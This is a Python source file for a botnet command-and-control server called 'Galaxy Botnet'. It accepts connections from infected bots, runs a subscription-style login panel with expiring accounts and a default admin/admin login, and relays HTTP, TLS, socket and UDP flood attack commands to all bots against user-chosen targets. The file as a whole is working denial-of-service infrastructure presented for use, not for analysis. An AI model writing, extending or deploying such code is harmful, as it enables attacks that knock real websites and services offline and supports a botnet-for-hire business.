import socket
import threading
import sys
import time
import json
import os
import requests
from datetime import datetime
from colorama import Fore, init, Style

GRADIENT = [
    '\033[38;2;148;0;211m',
    '\033[38;2;153;50;204m',
    '\033[38;2;186;85;211m',  
    '\033[38;2;218;112;214m', 
    '\033[38;2;238;130;238m', 
    '\033[38;2;255;0;255m',  
    '\033[38;2;255;105;180m'
]

def apply_gradient(text):
    result = []
    gradient_len = len(GRADIENT)
    text_len = len(text)
    
    for i, char in enumerate(text):
        if char.strip():
            color_index = int((i / text_len) * (gradient_len - 1))
            result.append(f"{GRADIENT[color_index]}{char}")
        else:
            result.append(char)
    return ''.join(result)


bot_connections = []
active_attacks = {}
max_global_conc = 15
ansi_clear = '\033[2J\033[H'

user_template = {
    "username": "",
    "password": "",
    "max_conc": 3,
    "expiry_date": "2023-12-31",
    "is_admin": 0,
    "is_vip": 0,
    "max_attack_time": 60
}

def get_isp_info(ip):
    try:
        response = requests.get(f"https://ipinfo.io/{ip}/org", timeout=3)
        return response.text.strip() if response.status_code == 200 else "Unknown ISP"
    except:
        return "Unknown ISP"

if not os.path.exists('users.json'):
    with open('users.json', 'w') as f:
        json.dump({"admin": {**user_template, 
                           "username": "admin", 
                           "password": "admin", 
                           "is_admin": 1, 
                           "max_conc": 5,
                           "max_attack_time": 1200}}, f)

def load_users():
    with open('users.json') as f:
        return json.load(f)

def save_users(users):
    with open('users.json', 'w') as f:
        json.dump(users, f, indent=4)

def send_command_to_bots(command):
    """Send command to all connected bots"""
    dead_bots = []
    for bot in bot_connections:
        try:
            if not command.endswith('\n'):
                command_with_newline = command + '\n'
            else:
                command_with_newline = command
            
            bot.sendall(command_with_newline.encode())
            print(f"{GRADIENT[2]}Sent to bot: {command.strip()}")
        except Exception as e:
            print(f"{GRADIENT[0]}Failed to send to bot: {e}")
            dead_bots.append(bot)
    
    # Remove dead bots
    for bot in dead_bots:
        if bot in bot_connections:
            bot_connections.remove(bot)
            try:
                bot.close()
            except:
                pass

def handle_bot_ping(bot_socket, addr):
    try:
        while True:
            data = bot_socket.recv(1024)
            if not data:
                break
            
            message = data.decode().strip()
            if message == "PING":
                bot_socket.sendall(b"PONG\n")
                print(f"{GRADIENT[3]}Received PING from {addr}, sent PONG")
            elif message.startswith("CJCB"):
                print(f"{GRADIENT[4]}Bot connected from {addr} with handshake: {message}")
            else:
                print(f"{GRADIENT[5]}Message from {addr}: {message}")
                
    except Exception as e:
        print(f"{GRADIENT[0]}Bot {addr} disconnected: {e}")
    finally:
        if bot_socket in bot_connections:
            bot_connections.remove(bot_socket)
        try:
            bot_socket.close()
        except:
            pass

def start_bot_server(port=3000):
    """Start server to listen for bot connections"""
    bot_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    bot_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        bot_server.bind(('0.0.0.0', port))
        bot_server.listen()
        print(f"{GRADIENT[4]}Bot server started on port {port}")
        
        while True:
            bot_socket, addr = bot_server.accept()
            print(f"{GRADIENT[2]}New bot connection from {addr}")
            
            # Add to global list
            bot_connections.append(bot_socket)
            
            # Start thread to handle bot communication
            bot_thread = threading.Thread(
                target=handle_bot_ping, 
                args=(bot_socket, addr),
                daemon=True
            )
            bot_thread.start()
            
    except Exception as e:
        print(f"{GRADIENT[0]}Bot server error: {e}")

def find_login(username, password):
    users = load_users()
    if username in users:
        if users[username]['password'] == password:
            expiry_date = datetime.strptime(users[username]['expiry_date'], "%Y-%m-%d")
            if datetime.now() > expiry_date:
                return "expired"
            return users[username]
    return None

def send(socket, data, escape=True, reset=True):
    if reset:
        data += Style.RESET_ALL
    if escape:
        data += '\r\n'
    socket.send(data.encode())

def update_title(client, username, user_data):
    users = load_users()
    while True:
        try:
            expiry_date = datetime.strptime(user_data['expiry_date'], "%Y-%m-%d")
            days_left = (expiry_date - datetime.now()).days
            active_conc = len([a for a in active_attacks.values() if a['username'] == username])
            max_conc = users.get(username, {}).get('max_conc', 3)
            title = f'💫 Galaxy Botnet | Concs: {active_conc}/{max_conc} | Global concs: {len(active_attacks)}/{max_global_conc} | Expiry: {days_left}d.'
            send(client, f'\33]0;{title}\a', False)
            time.sleep(2)
        except:
            client.close()
            break

def can_launch_attack(username):
    users = load_users()
    user_data = users.get(username, {})
    
    # Check user's max conc
    user_active = len([a for a in active_attacks.values() if a['username'] == username])
    if user_active >= user_data.get('max_conc', 3):
        return False, "User conc limit reached"
    
    # Check global conc
    if len(active_attacks) >= max_global_conc:
        return False, "Global conc limit reached"
    
    return True, ""

def attack_timer(attack_id, attack_time, username, target):
    """Background thread to track attack duration and remove when expired"""
    start_time = time.time()
    end_time = start_time + attack_time
    
    while time.time() < end_time:
        time.sleep(1)
    
    # Attack time expired, remove from active attacks
    if attack_id in active_attacks:
        active_attacks.pop(attack_id)
        try:
            send_command_to_bots(f"STOPL7")
        except:
            pass

def command_line(client, username, user_data):
    users = load_users()
    user_data = users.get(username, {})
    
    try:
        from bannersanim.banners import banner, helpmessage1, helpmessage2
    except:
        banner = """
╔══════════════════════════════════════════════════════════╗
║                    GALAXY BOTNET CNC                     ║
╚══════════════════════════════════════════════════════════╝
"""
        helpmessage1 = """
╔══════════════════════════════════════════════════════════╗
║                        HELP MENU                         ║
╚══════════════════════════════════════════════════════════╝
"""
        helpmessage2 = """
Commands:
HELP    - Show this menu
CLEAR   - Clear screen
LOGOUT  - Logout from CNC
WHOAMI  - Show user info
METHODS - Show attack methods
"""
    
    for x in banner.split('\n'):
        send(client, apply_gradient(x))

    prompt = f'{GRADIENT[-1]}[{username}] ► '
    send(client, prompt, False)

    while True:
        try:
            data = client.recv(1024).decode().strip()
            if not data:
                continue

            args = data.split(' ')
            command = args[0].upper()
            
            if command == 'HELP':
                for x in helpmessage1.split('\n'):
                    send(client, apply_gradient(x))
                for x2 in helpmessage2.split('\n'):
                    send(client, apply_gradient(x2))
                send(client, '')

            elif command == 'CLEAR':
                send(client, ansi_clear, False)
                for x in banner.split('\n'):
                    send(client, apply_gradient(x))

            elif command == 'LOGOUT':
                send(client, f'{GRADIENT[3]}Goodbye :-)')
                time.sleep(1)
                break
                
            elif command == 'WHOAMI':
                expiry_date = datetime.strptime(user_data['expiry_date'], "%Y-%m-%d")
                days_left = (expiry_date - datetime.now()).days
                
                send(client, f'{GRADIENT[2]}Username: {username}')
                send(client, f'Account type: {"VIP" if user_data["is_vip"] else "Standard"}')
                send(client, f'Max concurrent attacks: {user_data["max_conc"]}')
                send(client, f'Max attack time: {user_data["max_attack_time"]}s')
                send(client, f'Expiry date: {user_data["expiry_date"]} ({days_left} days left)')
                send(client, f'Admin privileges: {"Yes" if user_data["is_admin"] else "No"}')
                send(client, f'Connected bots: {len(bot_connections)}')

            elif command == 'METHODS':
                send(client, f'{GRADIENT[3]}Available attack methods:')
                send(client, f'{GRADIENT[2]}HTTP-FLOOD - HTTP GET flood attack')
                send(client, f'{GRADIENT[2]}TREASURE   - High traffic HTTP attack')
                send(client, f'{GRADIENT[2]}SOCKET     - HTTP/1.1 socket flood')
                send(client, f'{GRADIENT[2]}TLS        - HTTP/2 POST flood')
                send(client, f'{GRADIENT[2]}PROXY      - Update proxy list')
                send(client, f'{GRADIENT[2]}STOPL7     - Stop all attacks')

            elif command in ['HTTP-FLOOD', 'TLS', 'SOCKET', 'TREASURE']:
                if len(args) < 3:
                    send(client, f'{GRADIENT[0]}Usage: <method> <target> <time>')
                else:
                    target = args[1]
                    
                    # Check blacklist
                    is_blacklisted = False
                    try:
                        with open('blacklist.txt', 'r') as f:
                            blacklist = f.read().splitlines()
                            for entry in blacklist:
                                if entry.strip() and entry in target:
                                    is_blacklisted = True
                                    break
                    except FileNotFoundError:
                        pass
                    
                    if is_blacklisted:
                        send(client, f'{GRADIENT[0]}Target is blacklisted! Attack aborted.')
                    elif len(bot_connections) == 0:
                        send(client, f'{GRADIENT[0]}No bots connected!')
                    else:
                        can_attack, reason = can_launch_attack(username)
                        if not can_attack:
                            send(client, f'{GRADIENT[0]}Cannot launch attack: {reason}')
                        else:
                            try:
                                attack_time = int(args[2])
                                if attack_time > user_data['max_attack_time']:
                                    send(client, f'{GRADIENT[0]}Attack time exceeds your maximum of {user_data["max_attack_time"]} seconds')
                                    continue
                            except:
                                send(client, f'{GRADIENT[0]}Invalid attack time')
                                continue
                            
                            # Get target info
                            try:
                                import socket
                                if '://' in target:
                                    hostname = target.split('://')[1].split('/')[0].split(':')[0]
                                else:
                                    hostname = target.split('/')[0].split(':')[0]
                                ip = socket.gethostbyname(hostname)
                                org_info = get_isp_info(ip)
                            except:
                                org_info = "Unknown ISP"
                            
                            # Create attack entry
                            attack_id = f"{username}-{int(time.time())}"
                            active_attacks[attack_id] = {
                                'username': username,
                                'method': command,
                                'target': target,
                                'time': attack_time,
                                'start_time': time.time()
                            }
                            
                            # Start attack timer
                            threading.Thread(
                                target=attack_timer,
                                args=(attack_id, attack_time, username, target),
                                daemon=True
                            ).start()
                            
                            # Send command to all bots
                            send_command_to_bots(f"{command} {target} {attack_time}")
                            
                            # Show attack info
                            send(client, ansi_clear, False)
                            for x in banner.split('\n'):
                                send(client, apply_gradient(x))
                            
                            attack_info = (f'''
{GRADIENT[3]}╔══════════════════════════════════╗
║{GRADIENT[4]} Attack successfully launched!{GRADIENT[3]} 
╠══════════════════════════════════╣
║ {GRADIENT[2]}Method: {GRADIENT[5]}{command:<25} {GRADIENT[3]}
║ {GRADIENT[2]}Target: {GRADIENT[5]}{target:<25} {GRADIENT[3]}
║ {GRADIENT[2]}Time: {GRADIENT[5]}{attack_time} seconds{' '*(18-len(str(attack_time)))} {GRADIENT[3]}
║ {GRADIENT[2]}Provider: {GRADIENT[5]}{org_info:<18} {GRADIENT[3]}
║ {GRADIENT[2]}Attack ID: {GRADIENT[5]}{attack_id:<18} {GRADIENT[3]}
╚══════════════════════════════════╝{Style.RESET_ALL}''')
                            
                            for x in attack_info.split('\n'):
                                send(client, f"{x}")

            elif command in ['UDPRAW']:
                if len(args) < 4:
                    send(client, f'{GRADIENT[0]}Usage: <method> <target> <port> <time>')
                else:
                    target = args[1]
                    port = args[2]                
                    
                    # Check blacklist
                    is_blacklisted = False
                    try:
                        with open('blacklist.txt', 'r') as f:
                            blacklist = f.read().splitlines()
                            for entry in blacklist:
                                if entry.strip() and entry in target:
                                    is_blacklisted = True
                                    break
                    except FileNotFoundError:
                        pass
                    
                    if is_blacklisted:
                        send(client, f'{GRADIENT[0]}Target is blacklisted! Attack aborted.')
                    elif len(bot_connections) == 0:
                        send(client, f'{GRADIENT[0]}No bots connected!')
                    else:
                        can_attack, reason = can_launch_attack(username)
                        if not can_attack:
                            send(client, f'{GRADIENT[0]}Cannot launch attack: {reason}')
                        else:
                            try:
                                attack_time = int(args[2])
                                if attack_time > user_data['max_attack_time']:
                                    send(client, f'{GRADIENT[0]}Attack time exceeds your maximum of {user_data["max_attack_time"]} seconds')
                                    continue
                            except:
                                send(client, f'{GRADIENT[0]}Invalid attack time')
                                continue
                            
                            # Get target info
                            try:
                                import socket
                                if '://' in target:
                                    hostname = target.split('://')[1].split('/')[0].split(':')[0]
                                else:
                                    hostname = target.split('/')[0].split(':')[0]
                                ip = socket.gethostbyname(hostname)
                                org_info = get_isp_info(ip)
                            except:
                                org_info = "Unknown ISP"
                            
                            # Create attack entry
                            attack_id = f"{username}-{int(time.time())}"
                            active_attacks[attack_id] = {
                                'username': username,
                                'method': command,
                                'target': target,
                                'time': attack_time,
                                'start_time': time.time()
                            }
                            
                            # Start attack timer
                            threading.Thread(
                                target=attack_timer,
                                args=(attack_id, attack_time, username, target),
                                daemon=True
                            ).start()
                            
                            # Send command to all bots
                            send_command_to_bots(f"{command} {target} {port} {attack_time}")
                            
                            # Show attack info
                            send(client, ansi_clear, False)
                            for x in banner.split('\n'):
                                send(client, apply_gradient(x))
                            
                            attack_info = (f'''
{GRADIENT[3]}╔══════════════════════════════════╗
║{GRADIENT[4]} Attack successfully launched!{GRADIENT[3]} 
╠══════════════════════════════════╣
║ {GRADIENT[2]}Method: {GRADIENT[5]}{command:<25} {GRADIENT[3]}
║ {GRADIENT[2]}Target: {GRADIENT[5]}{target:<25} {GRADIENT[3]}
║ {GRADIENT[2]}Time: {GRADIENT[5]}{attack_time} seconds{' '*(18-len(str(attack_time)))} {GRADIENT[3]}
║ {GRADIENT[2]}Provider: {GRADIENT[5]}{org_info:<18} {GRADIENT[3]}
║ {GRADIENT[2]}Attack ID: {GRADIENT[5]}{attack_id:<18} {GRADIENT[3]}
╚══════════════════════════════════╝{Style.RESET_ALL}''')
                            
                            for x in attack_info.split('\n'):
                                send(client, f"{x}")


            elif command == 'PROXY':
                send_command_to_bots("PROXY")
                send(client, f'{GRADIENT[4]}Proxy update command sent to all bots')

            elif command == 'STOPL7':
                send_command_to_bots("STOPL7")
                active_attacks.clear()
                send(client, f'{GRADIENT[4]}All attacks stopped')

            else:
                send(client, f'{GRADIENT[0]}Unknown Command. Type HELP for commands.')

            send(client, prompt, False)
        except Exception as e:
            print(f"User {username} disconnected: {e}")
            break
    
    client.close()

def handle_user_client(client, address):
    """Handle user connections to CNC"""
    send(client, f'\33]0;Galaxy Botnet loading..\a', False)
    
    # Load login banners
    try:
        from bannersanim.banners import bannerlogin1, bannerlogin2, bannerlogin3, bannerlogin4, expirybanner
    except:
        # Fallback banners
        bannerlogin1 = bannerlogin2 = bannerlogin3 = bannerlogin4 = """
╔══════════════════════════════════════════════════════════╗
║                    GALAXY BOTNET LOGIN                   ║
╚══════════════════════════════════════════════════════════╝
"""
        expirybanner = "ACCOUNT EXPIRED"
    
    # Show login animation
    login_banners = [bannerlogin1, bannerlogin2, bannerlogin3, bannerlogin4]
    for banner in login_banners:
        send(client, ansi_clear, False)
        for x in banner.split('\n'):
            send(client, apply_gradient(x))
        time.sleep(0.9)
    
    send(client, ansi_clear, False)
    send(client, f'\33]0;Galaxy Botnet | Login\a', False)

    # Get username
    while True:
        send(client, ansi_clear, False)
        send(client, f'{GRADIENT[3]}Username: ', False)
        username = client.recv(1024).decode().strip()
        if username:
            break
    
    # Get password
    password = ''
    while True:
        send(client, ansi_clear, False)
        send(client, f'{GRADIENT[3]}Password:{Fore.BLACK} ', False, False)
        password = client.recv(1024).decode('cp1252').strip()
        if password:
            break
    
    # Check login
    send(client, ansi_clear, False)
    user_data = find_login(username, password)
    
    if user_data == "expired":
        send(client, f'{GRADIENT[0]}{expirybanner}')
        time.sleep(3)
        client.close()
        return
    elif not user_data:
        send(client, f'{GRADIENT[0]}Invalid username or password')
        time.sleep(1)
        client.close()
        return
    
    # Login successful
    print(f"{GRADIENT[4]}User {username} logged in from {address[0]}")
    
    # Start title updater
    threading.Thread(
        target=update_title, 
        args=(client, username, user_data),
        daemon=True
    ).start()
    
    # Start command line interface
    command_line(client, username, user_data)

def start_cnc_server(cnc_port):
    """Start CNC server for user connections"""
    cnc_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    cnc_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        cnc_server.bind(('0.0.0.0', cnc_port))
        cnc_server.listen()
        print(f"{GRADIENT[4]}CNC server started on port {cnc_port}")
        
        while True:
            client_socket, addr = cnc_server.accept()
            print(f"{GRADIENT[3]}New user connection from {addr}")
            
            # Handle user in separate thread
            user_thread = threading.Thread(
                target=handle_user_client,
                args=(client_socket, addr),
                daemon=True
            )
            user_thread.start()
            
    except Exception as e:
        print(f"{GRADIENT[0]}CNC server error: {e}")

def main():
    if len(sys.argv) != 2:
        print(f'Usage: python {sys.argv[0]} <cnc_port>')
        print('Example: python cnc.py 4444')
        exit()

    cnc_port = sys.argv[1]
    
    if not cnc_port.isdigit() or int(cnc_port) < 1 or int(cnc_port) > 65535:
        print('Invalid CNC port (1-65535)')
        exit()
        
    cnc_port = int(cnc_port)

    init(convert=True)
    
    print(f"{GRADIENT[4]}Starting Galaxy Botnet CNC...")
    print(f"{GRADIENT[3]}User CNC port: {cnc_port}")
    print(f"{GRADIENT[3]}Bot port: 3000")
    
    # Start bot server in separate thread
    bot_server_thread = threading.Thread(
        target=start_bot_server,
        args=(3000,),
        daemon=True
    )
    bot_server_thread.start()
    
    # Start CNC server for users
    start_cnc_server(cnc_port)

if __name__ == '__main__':
    main()